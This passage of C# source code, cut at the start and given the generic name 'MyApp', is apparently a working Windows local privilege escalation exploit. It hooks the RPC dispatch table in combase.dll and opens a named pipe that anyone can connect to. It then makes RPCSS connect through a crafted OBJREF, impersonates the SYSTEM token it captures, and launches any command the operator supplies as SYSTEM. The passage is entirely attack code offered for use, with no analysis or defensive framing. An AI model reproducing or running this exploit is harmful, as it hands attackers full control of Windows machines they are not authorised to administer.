                    pi = new PROCESS_INFORMATION();
                    return false;
                }

                if (N.NtResumeProcess(pi.hProcess) != K.STATUS_SUCCESS)
                {
                    Log.Fail("NtResumeProcess failed");
                    N.CloseHandle(pi.hThread);
                    N.CloseHandle(pi.hProcess);
                    pi = new PROCESS_INFORMATION();
                    return false;
                }

                Log.Ok("Process launched via NtSetInformationProcess. PID=" + pi.dwProcessId);
                return true;
            }
            finally { Marshal.FreeHGlobal(pat); }
        }
    }

    // ========================================================================
    // MYAPP CONTEXT — hook + pipe server
    // ========================================================================
    class MyAppContext
    {
        static readonly Guid OrcbRpcGuid = new Guid("18f70770-8e64-11cf-9af1-0020af6e72f4");

        public IntPtr CombaseModule { get; private set; }
        public IntPtr DispatchTablePtr { get; private set; }
        public IntPtr UseProtseqFnPtr { get; private set; }
        public uint   UseProtseqParamCount { get; private set; }

        private IntPtr[] _dispatchTable;
        private short[]  _fmtStringOffsets;
        private IntPtr   _procString;
        private Delegate _hookDelegate;

        public string ServerPipeName { get; private set; }
        public string ClientEndpoint { get; private set; }

        public WindowsIdentity SystemIdentity { get; private set; }
        Thread _pipeThread;
        public bool IsHooked { get; private set; }
        public bool IsRunning { get; private set; }

        public MyAppContext(string pipeTag)
        {
            ServerPipeName = @"\\.\pipe\" + pipeTag + @"\pipe\epmapper";
            ClientEndpoint = "ncacn_np:localhost/pipe/" + pipeTag + @"[\pipe\epmapper]";
            InitContext();
            ResolveDelegate();
        }

        void InitContext()
        {
            foreach (ProcessModule m in Process.GetCurrentProcess().Modules)
            {
                if (m.ModuleName == null) continue;
                if (m.ModuleName.ToLowerInvariant() != "combase.dll") continue;

                CombaseModule = m.BaseAddress;

                MemoryStream pat = new MemoryStream();
                BinaryWriter bw = new BinaryWriter(pat);
                bw.Write(Marshal.SizeOf(typeof(RPC_SERVER_INTERFACE)));
                bw.Write(OrcbRpcGuid.ToByteArray());
                bw.Flush();
                byte[] pattern = pat.ToArray();

                byte[] content = new byte[m.ModuleMemorySize];
                Marshal.Copy(m.BaseAddress, content, 0, content.Length);

                List<int> hits = Sunday.Search(content, pattern);
                if (hits.Count == 0)
                    throw new Exception("orcbRPC pattern not found in combase.dll");

                IntPtr hitPtr = new IntPtr(m.BaseAddress.ToInt64() + hits[0]);
                RPC_SERVER_INTERFACE srv = (RPC_SERVER_INTERFACE)Marshal.PtrToStructure(
                    hitPtr, typeof(RPC_SERVER_INTERFACE));

                RPC_DISPATCH_TABLE disp = (RPC_DISPATCH_TABLE)Marshal.PtrToStructure(
                    srv.DispatchTable, typeof(RPC_DISPATCH_TABLE));

                MIDL_SERVER_INFO midl = (MIDL_SERVER_INFO)Marshal.PtrToStructure(
                    srv.InterpreterInfo, typeof(MIDL_SERVER_INFO));

                DispatchTablePtr = midl.DispatchTable;
                _procString = midl.ProcString;

                int count = (int)disp.DispatchTableCount;
                _dispatchTable = new IntPtr[count];
                _fmtStringOffsets = new short[count];

                for (int i = 0; i < count; i++)
                    _dispatchTable[i] = Marshal.ReadIntPtr(DispatchTablePtr, i * IntPtr.Size);
                for (int i = 0; i < count; i++)
                    _fmtStringOffsets[i] = Marshal.ReadInt16(midl.FmtStringOffset,
                        i * sizeof(short));

                UseProtseqFnPtr = _dispatchTable[0];
                UseProtseqParamCount = Marshal.ReadByte(_procString, _fmtStringOffsets[0] + 19);

                Log.Ok(string.Format("combase @ 0x{0:X}  dispatch @ 0x{1:X}  params={2}",
                    CombaseModule.ToInt64(), DispatchTablePtr.ToInt64(), UseProtseqParamCount));
                return;
            }
            throw new Exception("combase.dll not loaded");
        }

        void ResolveDelegate()
        {
            NewOrcbRPC rpc = new NewOrcbRPC(this);
            switch (UseProtseqParamCount)
            {
                case 4:  _hookDelegate = new NewOrcbRPC.D4(rpc.F4);   break;
                case 5:  _hookDelegate = new NewOrcbRPC.D5(rpc.F5);   break;
                case 6:  _hookDelegate = new NewOrcbRPC.D6(rpc.F6);   break;
                case 7:  _hookDelegate = new NewOrcbRPC.D7(rpc.F7);   break;
                case 8:  _hookDelegate = new NewOrcbRPC.D8(rpc.F8);   break;
                case 9:  _hookDelegate = new NewOrcbRPC.D9(rpc.F9);   break;
                case 10: _hookDelegate = new NewOrcbRPC.D10(rpc.F10); break;
                case 11: _hookDelegate = new NewOrcbRPC.D11(rpc.F11); break;
                case 12: _hookDelegate = new NewOrcbRPC.D12(rpc.F12); break;
                case 13: _hookDelegate = new NewOrcbRPC.D13(rpc.F13); break;
                case 14: _hookDelegate = new NewOrcbRPC.D14(rpc.F14); break;
                default: throw new Exception("unsupported UseProtseqParamCount=" + UseProtseqParamCount);
            }
        }

        public void Hook()
        {
            uint old;
            uint size = (uint)(IntPtr.Size * _dispatchTable.Length);
            if (!N.VirtualProtect(DispatchTablePtr, size, 0x04, out old))
                throw new Exception("VirtualProtect: " + Log.LastErr());

            Marshal.WriteIntPtr(DispatchTablePtr,
                Marshal.GetFunctionPointerForDelegate(_hookDelegate));
            IsHooked = true;
            Log.Ok("RPC dispatch table hooked");
        }

        public void Restore()
        {
            if (!IsHooked || UseProtseqFnPtr == IntPtr.Zero) return;
            try
            {
                Marshal.WriteIntPtr(DispatchTablePtr, UseProtseqFnPtr);
                IsHooked = false;
                Log.Info("RPC dispatch table restored");
            }
            catch (Exception e) { Log.Warn("Restore: " + e.Message); }
        }

        void PipeServer()
        {
            IntPtr sd;
            uint sdSize;
            if (!N.ConvertStringSecurityDescriptorToSecurityDescriptor(
                "D:(A;OICI;GA;;;WD)", 1, out sd, out sdSize))
            { Log.Fail("ConvertSDDL: " + Log.LastErr()); return; }

            SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
            sa.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
            sa.pSecurityDescriptor = sd;
            sa.bInheritHandle = false;

            IntPtr hPipe = N.CreateNamedPipe(ServerPipeName,
                K.PIPE_ACCESS_DUPLEX,
                K.PIPE_TYPE_BYTE | K.PIPE_READMODE_BYTE | K.PIPE_WAIT,
                K.PIPE_UNLIMITED_INSTANCES,
                512, 512, 0, ref sa);

            if (hPipe == IntPtr.Zero || hPipe == new IntPtr(-1))
            {
                Log.Fail("CreateNamedPipe: " + Log.LastErr());
                if (sd != IntPtr.Zero) N.LocalFree(sd);
                return;
            }
            Log.Info("Pipe created: " + ServerPipeName);

            try
            {
                bool ok = N.ConnectNamedPipe(hPipe, IntPtr.Zero);
                int err = Marshal.GetLastWin32Error();
                if (!ok && err != K.ERROR_PIPE_CONNECTED)
                {
                    Log.Fail("ConnectNamedPipe: err=" + err);
                    return;
                }
                Log.Ok("Client connected to pipe");

                if (!N.ImpersonateNamedPipeClient(hPipe))
                { Log.Fail("ImpersonateNamedPipeClient: " + Log.LastErr()); return; }

                WindowsIdentity id = WindowsIdentity.GetCurrent();
                Log.Info("Impersonated: " + id.Name + "  level=" + id.ImpersonationLevel);

                if (id.ImpersonationLevel >= TokenImpersonationLevel.Impersonation)
                    SystemIdentity = id;
                else
                {
                    Log.Warn("Impersonation level too low — reverting");
                    N.RevertToSelf();
                }
            }
            finally
            {
                if (hPipe != IntPtr.Zero && hPipe != new IntPtr(-1))
                {
                    N.DisconnectNamedPipe(hPipe);
                    N.CloseHandle(hPipe);
                }
                if (sd != IntPtr.Zero) N.LocalFree(sd);
            }
        }

        public void StartPipe()
        {
            _pipeThread = new Thread(PipeServer);
            _pipeThread.IsBackground = true;
            _pipeThread.Start();
            IsRunning = true;
        }

        public void StopPipe()
        {
            IsRunning = false;
            if (_pipeThread == null) return;

            try
            {
                IntPtr h = N.CreateFileW(ServerPipeName,
                    0x40000000 | 0x80000000, FileShare.ReadWrite,
                    IntPtr.Zero, FileMode.Open, 0, IntPtr.Zero);
                if (h != IntPtr.Zero && h != new IntPtr(-1))
                {
                    byte[] b = new byte[1] { 0xAA };
                    using (var fs = new FileStream(h, FileAccess.Write)) { fs.Write(b, 0, 1); }
                    N.CloseHandle(h);
                }
            }
            catch { }

            _pipeThread.Join(3000);
        }

        public WindowsIdentity GetIdentity() { return SystemIdentity; }
    }

    // ========================================================================
    // TRIGGER
    // ========================================================================
    class MyAppTrigger
    {
        static readonly Guid IID_IUnknown = new Guid("00000000-0000-0000-C000-000000000046");

        MyAppContext _ctx;
        object _fake = new object();
        IntPtr _pUnk;
        IBindCtx _bind;
        IMoniker _moniker;

        public MyAppTrigger(MyAppContext ctx)
        {
            _ctx = ctx;
            _pUnk = Marshal.GetIUnknownForObject(_fake);
            N.CreateBindCtx(0, out _bind);
            N.CreateObjrefMoniker(_pUnk, out _moniker);
        }

        public int Trigger()
        {
            string display;
            _moniker.GetDisplayName(_bind, null, out display);
            display = display.Replace("objref:", "").Replace(":", "");
            byte[] objBytes = Convert.FromBase64String(display);

            ObjRef src = new ObjRef(objBytes);
            Log.Info("DCOM OXID: 0x" + src.StandardObjRef.OXID.ToString("X"));
            Log.Info("DCOM IPID: " + src.StandardObjRef.IPID);

            ObjRef.StringBinding sb = new ObjRef.StringBinding(
                TowerProtocol.EPM_PROTOCOL_NP, "localhost");
            ObjRef.SecurityBinding secb = new ObjRef.SecurityBinding(0xa, 0xffff, null);
            ObjRef.DualStringArray dsa = new ObjRef.DualStringArray(sb, secb);

            ObjRef objRef = new ObjRef(IID_IUnknown,
                new ObjRef.Standard(0, 1, src.StandardObjRef.OXID, src.StandardObjRef.OID,
                    src.StandardObjRef.IPID, dsa));
            byte[] data = objRef.GetBytes();

            Log.Info("Marshal bytes len: " + data.Length);

            using (var ms = new MemoryStream(data))
            {
                IntPtr ppv;
                return N.CoUnmarshalInterface(new IStreamImpl(ms),
                    ref IID_IUnknown, out ppv);
            }
        }
    }

    // ========================================================================
    // PROGRAM
    // ========================================================================
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(@"
    __  __        ___               
   / / / /_  __  /   |  ____  ____  
  / /_/ / / / / / /| | / __ \/ __ \ 
 / __  / /_/ / / ___ |/ /_/ / /_/ / 
/_/ /_/\__, / /_/  |_/ .___/ .___/  
      /____/        /_/   /_/       
    MyApp v2.0 — RPCSS hook (single-file)
");

            string cmd = null;
            for (int i = 0; i < args.Length; i++)
            {
                if ((args[i] == "-cmd" || args[i] == "--cmd") && i + 1 < args.Length)
                    cmd = args[++i];
            }

            if (string.IsNullOrEmpty(cmd))
            {
                Console.WriteLine("Usage: MyApp.exe -cmd \"cmd.exe /c whoami\"");
                return;
            }

            Log.Info("Target command: " + cmd);

            if (!Tok.EnablePrivilege("SeImpersonatePrivilege"))
            { Log.Fail("SeImpersonatePrivilege is not available"); return; }
            Log.Ok("SeImpersonatePrivilege enabled");

            MyAppContext ctx = null;
            bool needRestore = false;
            try
            {
                string tag = "MyApp_" + Guid.NewGuid().ToString("N").Substring(0, 8);
                ctx = new MyAppContext(tag);

                ctx.Hook();
                needRestore = true;

                ctx.StartPipe();

                var trigger = new MyAppTrigger(ctx);
                Log.Info("Triggering RPCSS...");
                int hr = trigger.Trigger();
                Log.Info("CoUnmarshalInterface hr = 0x" + hr.ToString("X8"));

                for (int i = 0; i < 100; i++)
                {
                    if (ctx.GetIdentity() != null) break;
                    Thread.Sleep(100);
                }

                WindowsIdentity id = ctx.GetIdentity();
                if (id == null)
                { Log.Fail("Failed to capture SYSTEM identity"); return; }

                string sid = Tok.GetSid(id.Token);
                string il = Tok.GetIL(id.Token);
                Log.Info("SID: " + sid);
                Log.Info("IL : " + il);

                if (sid != K.SYSTEM_SID)
                {
                    Log.Fail("Not SYSTEM — aborting");
                    return;
                }
                Log.Ok("SYSTEM token captured");

                PROCESS_INFORMATION pi;
                if (!Tok.SpawnProcess(id.Token, cmd, out pi))
                { Log.Fail("Process creation failed"); return; }

                if (pi.hThread != IntPtr.Zero) N.CloseHandle(pi.hThread);
                if (pi.hProcess != IntPtr.Zero) N.CloseHandle(pi.hProcess);

                Log.Ok("Done.");
            }
            catch (Exception e)
            {
                Log.Fail(e.GetType().Name + ": " + e.Message);
                if (e.InnerException != null)
                    Log.Fail("  inner: " + e.InnerException.Message);
            }
            finally
            {
                if (ctx != null)
                {
                    if (needRestore) ctx.Restore();
                    try { ctx.StopPipe(); } catch { }
                }
            }
        }
    }
}
